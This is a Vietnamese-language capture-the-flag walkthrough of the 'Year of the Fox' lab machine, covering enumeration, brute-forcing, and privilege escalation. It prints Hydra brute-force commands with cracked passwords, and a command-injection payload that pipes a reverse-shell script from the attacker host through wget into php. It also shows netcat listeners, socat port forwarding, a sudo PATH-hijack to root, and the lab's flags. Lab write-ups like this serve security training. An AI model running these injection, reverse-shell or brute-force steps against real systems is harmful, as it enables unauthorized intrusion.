# YearOfTheFox 
<h1> enumeration </h1> 

> nmap -sC -sV [IP_Target]

<pre>
...
PORT STATE SERVICE REASON VERSION 

80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29

139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX) 

445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
...
</pre>


 > enum4linux

<pre>
enum4linux 10.10.65.232 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 30 21:46:42 2025

======================( Target Information )==============================

Target ........... 10.10.65.232 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

====================( Enumerating Workgroup/Domain on 10.10.65.232 )=====================

[+] Got domain/workgroup name: YEAROFTHEFOX

================( Nbtstat Information for 10.10.65.232 )========================

Looking up status of 10.10.65.232 YEAR-OF-THE-FOX <00> - B Workstation Service YEAR-OF-THE-FOX <03> - B Messenger Service YEAR-OF-THE-FOX <20> - B File Server Service ..MSBROWSE. <01> - B Master Browser YEAROFTHEFOX <00> - B Domain/Workgroup Name YEAROFTHEFOX <1d> - B Master Browser YEAROFTHEFOX <1e> - B Browser Service Elections

    MAC Address = 00-00-00-00-00-00


==========================( Session Check on 10.10.65.232 )===========================

[+] Server 10.10.65.232 allows sessions using username '', password ''

=======================( Getting domain SID for 10.10.65.232 )======================

Domain Name: YEAROFTHEFOX Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

=============================( OS information on 10.10.65.232 )==========================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.65.232 from srvinfo: YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03

============================( Users on 10.10.65.232 )=================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox Name: fox Desc:

user:[fox] rid:[0x3e8]

========================( Share Enumeration on 10.10.65.232 )========================

    Sharename       Type      Comment
    ---------       ----      -------
    yotf            Disk      Fox's Stuff -- keep out!
    IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))


Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    YEAROFTHEFOX         YEAR-OF-THE-FOX


[+] Attempting to map shares on 10.10.65.232

//10.10.65.232/yotf Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing *//10.10.65.232/IPC$ Mapping: N/A Listing: N/A Writing: N/A

==================( Password Policy Information for 10.10.65.232 )====================

[+] Attaching to 10.10.65.232 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

    [+] YEAR-OF-THE-FOX
    [+] Builtin


[+] Password Info for Domain: YEAR-OF-THE-FOX

    [+] Minimum password length: 5
    [+] Password history length: None
    [+] Maximum password age: 37 days 6 hours 21 minutes 
    [+] Password Complexity Flags: 000000

            [+] Domain Refuse Password Change: 0
            [+] Domain Password Store Cleartext: 0
            [+] Domain Password Lockout Admins: 0
            [+] Domain Password No Clear Change: 0
            [+] Domain Password No Anon Change: 0
            [+] Domain Password Complex: 0

    [+] Minimum password age: None
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: DisabledMinimum Password Length: 5

=============================( Groups on 10.10.65.232 )=============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

=============( Users on 10.10.65.232 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID:S-1-22-1

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[I] Found new SID:S-1-5-32

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)smbS-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group) S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)S-1-5-32-545 BUILTIN\Users (Local Group) S-1-5-32-546 BUILTIN\Guests (Local Group) S-1-5-32-547 BUILTIN\Power Users (Local Group) S-1-5-32-548 BUILTIN\Account Operators (Local Group) S-1-5-32-549 BUILTIN\Server Operators (Local Group) S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)

=======================( Getting printer info for 10.10.65.232 )======================

No printers returned.

enum4linux complete on Thu Oct 30 22:07:21 2025
</pre>

<h2> quan trọng </h2>
<pre>

 Sharename       Type      Comment
    ---------       ----      -------
    yotf            Disk      Fox's Stuff -- keep out!
    IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Workgroup            Master
    ---------            -------
    YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
smbS-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
 S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
    
</pre>

> <h3>phát hiên port 80 thuộc http</h3>
<pre>
truy câp và phát hiện khung đăng nhập như sau 
<img width="509" height="134" alt="image" src="https://github.com/user-attachments/assets/aae1fb64-bdd6-4bc4-bd4e-4310e1838e21" />
</pre>

> <h3> phát hiện port 139 netbios và samba 445 </h3>
<pre>
hai user khả nghi : 

 S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)
 S-1-22-1-1000 Unix User\fox (Local User)S-1-22-1-1001 Unix User\rascal (Local User)
 
file share thông qua Samba :
yotf            Disk      Fox's Stuff -- keep out!
</pre>

<h2>exploite</h2>
<pre>
 > <h4> hydra -l rascal -P /home/kali/Downloads/rockyou-master/rockyou.txt 10.10.197.215 http-get / <h4> 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 00:11:27

 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore 

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-> get://10.10.197.215:80/ [80][http-get] host: 10.10.197.215 login: rascal password: leonardo 1 of 1 target successfully completed,
1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-31 00:11:57
</pre>

> username : rascal
> password : leonardo
(chú ý password thay đổi liên tục)

sau khi có password tiến hành truy cập vào website
<img width="706" height="389" alt="image (1)" src="https://github.com/user-attachments/assets/40575a3e-f614-4142-b384-f83f39e2b07e" />

<h3> 
để làm được bước tiếp theo , cần phải chuẩn bị file shell https://github.com/pentestmonkey/php-reverse-shell 
tải về , vào file va thay đổi thông tin IP thành địa chỉ tương ứng trong bài này là :
</h3>    

> 10.21.161.107 
<pre>
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
</pre>

<h3>
    sau khi chỉnh sửa xong file shell , mở http server để máy target tải file shell về 
    chú ý bật http server tại đúng nơi có file shell
</h3>

> sudo python3 -m http.server 8000

<h3>
sau khi chỉnh sửa xong , qua tab khác mở lắng nghe 
</h3>

> nc -lvnp 1234 (hoặc tương ứng với port trong file shel)
<pre>
nc -lvnp 1234 listening on [any] 1234
</pre>


 <h2>
vào website thành công nhưng không có nhiều thông tin , tiến hành chặn request bằng burpsuite và khai thác shell bằng cách thay đổi trường target trong request
 </h2>
 
> "target":"\"; wget -O - -q http://10.21.161.107:8000/php-reverse-shell.php | php; \""
 

 <pre>
POST /assets/php/search.php HTTP/1.1

Host: 10.10.197.215

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: /

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: text/plain;charset=UTF-8

Content-Length: 89

Origin: http://10.10.197.215

Authorization: Basic cmFzY2FsOmxlb25hcmRv

Connection: keep-alive

Referer: http://10.10.197.215/

Priority: u=0

{

"target":"\"; wget -O - -q http://10.21.161.107:8000/php-reverse-shell.php | php; \""

}
 </pre>
> phải làm theo trình tự từ trên xuống dưới đầu tiên là phải có file shell được chỉnh sửa thành ip và port muốn lắng nghe tới sau đó mở http server trên đường dẫn có chứa file , hai là phải bật lắng nghe theo cặp ip và port chỉnh trong file shell , ba là tiến hành chặn request và forward để target tải shell và thực thi , lúc này sẽ có đc shell www-data

<h2>sau khi request máy target sẽ đên ip của máy hacker và tiến hành tải file shell php-reverse-shell.php nếu thành công kết quả như sau : </h2>
<pre>
sudo python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 

10.10.197.215 - - [31/Oct/2025 00:22:47] "GET /php-reverse-shell.php HTTP/1.1" 200 -
</pre>

<h2> sau khi máy target tải thành công shell về sẽ thực thi file shell và tiến hành gửi shell tới máy hacker nếu thành công kết quả như sau : </h2>
<pre>
nc -lvnp 1234 listening on [any] 1234

 ... connect to [10.21.161.107] from (UNKNOWN) [10.10.197.215] 39186 

Linux year-of-the-fox 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 04:22:46 up 16 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT 

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

/bin/sh: 0: can't access tty; job control turned off

$
</pre>

<h1> 
Cờ thứ nhất Flag 1 nằm ở đường dẫn :
</h1>
<h1>
/var/www/web-flag.txt
</h1>
<pre>
$ cat web-flag.txt 
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
</pre>



<h1> 
Cờ thứ nhất Flag 2 bên trong user Fox :
</h1>
<h3>
để lấy được cờ user fox cần phải vào đc user fox tiến hành dò tìm các lỗ hổng để leo ngang quyền 
</h1>
    <pre>
netstat -tulw Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State
tcp 0 0 localhost:domain 0.0.0.0:* LISTEN
tcp 0 0 localhost:ssh 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:microsoft-ds 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:netbios-ssn 0.0.0.0:* LISTEN
tcp6 0 0 [::]:microsoft-ds [::]:* LISTEN
tcp6 0 0 [::]:netbios-ssn [::]:* LISTEN
tcp6 0 0 [::]:http [::]:* LISTEN
udp 0 0 localhost:domain 0.0.0.0:*
udp 0 0 ip-10-10-197-215:bootpc 0.0.0.0:*
udp 0 0 ip-10-10-255:netbios-ns 0.0.0.0:*
udp 0 0 ip-10-10-197:netbios-ns 0.0.0.0:*
udp 0 0 0.0.0.0:netbios-ns 0.0.0.0:*
udp 0 0 ip-10-10-25:netbios-dgm 0.0.0.0:*
udp 0 0 ip-10-10-19:netbios-dgm 0.0.0.0:*
udp 0 0 0.0.0.0:netbios-dgm 0.0.0.0:*
raw6 0 0 [::]:ipv6-icmp [::]:* 
    </pre>

<pre>
netstat -tulp | grep ssh 

(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) 

tcp 0 0 localhost:ssh 0.0.0.0:* LISTEN -$

==> suy ra ssh chạy trong máy và chỉ truy cập được qua localhost
</pre>

> cat /etc/ssh/sshd* | grep Allow*
<pre>
...
AllowUsers fox
...
==> suy ra chỉ có user fox mới ssh vào được . 
</pre>


<h3> sử dụng công cụ tên là socat tiến hành mở forward từ bên ngoài vào bên trong localhost port 22 </h3>
<h2> tải file socat : https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat về máy hacker và tiến hành mở http server tại đường dẫn chưa file để target có thể truy cập theo ip và port vào để tải file socat về máy .</h2>

<pre>
python3 -m http.server 8000 

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.10.186.1 - - [31/Oct/2025 05:04:46] "GET /socat HTTP/1.1" 200 -
</pre>



<h2> đứng từ máy target bằng user www-data cd vào  /tmp/ sau đó tải file socat từ hacker về </h2>    
<pre>
$ wget http://10.21.161.107:8000/socat 

--2025-10-31 09:04:44-- http://10.21.161.107:8000/socat 

Connecting to 10.21.161.107:8000... connected. 

HTTP request sent, awaiting response... 200 OK 

Length: 375176 (366K) [application/octet-stream] Saving to: 'socat'

 0K .......... .......... .......... .......... .......... 13% 83.1K 4s
50K .......... .......... .......... .......... .......... 27%  174K 2s
100K .......... .......... .......... .......... .......... 40% 85.4K 2s
 150K .......... .......... .......... .......... .......... 54% 162K 1s
200K .......... .......... .......... .......... .......... 68% 158K 1s
250K .......... .......... .......... .......... .......... 81% 159K 1s 
300K .......... .......... .......... .......... .......... 95% 176K 0s 
350K .......... ...... 100% 1.00M=2.7s

2025-10-31 09:04:48 (135 KB/s) - 'socat' saved [375176/375176]

$ ls socat
</pre>

<h3> sau đó cấp quyền chmod +x cho socat và thực hiên câu lệnh bên dưới để mở port forward</h3>
<pre>
    $ ./socat tcp-listen:8080,reuseaddr,fork tcp:localhost:22
</pre>

<h3>
    tại máy hacker tiến hành bruteforce vào địa chỉ ip của target (10.10.68.176) theo port được mở để forward vào port 22 bên trong là 8080
</h3>

> hydra -l fox -P /home/kali/Downloads/rockyou-master/rockyou.txt 10.10.68.176 ssh -s 8080

<pre>
hydra -l fox -P /home/kali/Downloads/rockyou-master/rockyou.txt 10.10.68.176 ssh -s 8080 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 05:08:40 

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking ssh://10.10.186.1:8080/ 

[8080][ssh] host: 10.10.186.1 login: fox password: shopping 1 of 1 target successfully completed, 1 valid password found 

[WARNING] Writing restore file because 3 final worker threads did not complete until end. 

[ERROR] 3 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-31 05:09:24
</pre>
> [8080][ssh] host: 10.10.186.1 login: fox password: shopping 1 of 1 target successfully completed, 1 valid password found

> username : fox

> password : shopping


<h3> sau khi có được password của user fox , đăng nhập vào bằng ssh trên port 8080 </h3>
<pre>
ssh fox@10.10.68.176 -p 8080 The authenticity of host '[10.10.186.1]:8080 ([10.10.186.1]:8080)' can't be established. ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo. This key is not known by a7y other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[10.10.186.1]:8080' (ED25519) to the list of known hosts. fox@10.10.186.1's password:

    __   __                       __   _   _            _____         
    \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
     \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
      | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
      |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                              


fox@year-of-the-fox:

~$

fox@year-of-the-fox:

$ ls 

samba user-flag.txt 

fox@year-of-the-fox:$ 

cat user-flag.txt 

THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
</pre>

<h1> sau khi có được cờ thứ 2 tiến hành dò cờ root </h1>
> check quyền của user fox

> sudo -l
<pre>
fox@year-of-the-fox:/tmp$ sudo -l 

Matching Defaults entries for fox on year-of-the-fox: 

                              (Thieu Secure-Path)

                            env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox: 

              (root) NOPASSWD: /usr/sbin/shutdown
</pre>
<h3> user fox có thể thực thi file shutdown bằng quyền root theo đường dẫn trên và không cần mật khẩu , do là file nhị phân nên cần xem xét bên trong có cấu trúc ra sau </h3>
<h3> tại nơi chứa file shutdown bật http server và tải file về máy hacker và sử dụng các công cụ như strings,binary ninja ,ghidra .... Để khám phá bên trong</h3>
<img width="428" height="53" alt="image" src="https://github.com/user-attachments/assets/7f5350d1-2b48-4100-adc9-7540c3c44bf1" />
<h3>file shutdown đang gọi hàm poweroff để tắt máy </h3>
> ==> suy ra do sudo -l của fox không có secure path nên có thể lợi dụng điểm này thay vì file shutdown gọi hàm poweroff của hệ thống mình có thể chinh sửa đường dẫn của mình và file poweroff sẽ có nội dung khác như sau :


<pre>
fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff 

fox@year-of-the-fox:/tmp$ ls 

poweroff

fox@year-of-the-fox:/tmp$ export PATH=/tmp:$PATH

fox@year-of-the-fox:/tmp$ sudo /usr/sbin/shutdown 

root@year-of-the-fox:/tmp# whoami root

root@year-of-the-fox:/tmp# find /home -group root -type f 

/home/rascal/.did-you-think-I-was-useless.root

 /home/fox/user-flag.txt 

/home/fox/samba/cipher.txt

 root@year-of-the-fox:/tmp# cat /home/rascal/.did-you-think-I-was-useless.root 

THM{ODM3NTdk MDljYmM4Z jdhZWFhY2 VjY2Fk}
</pre>
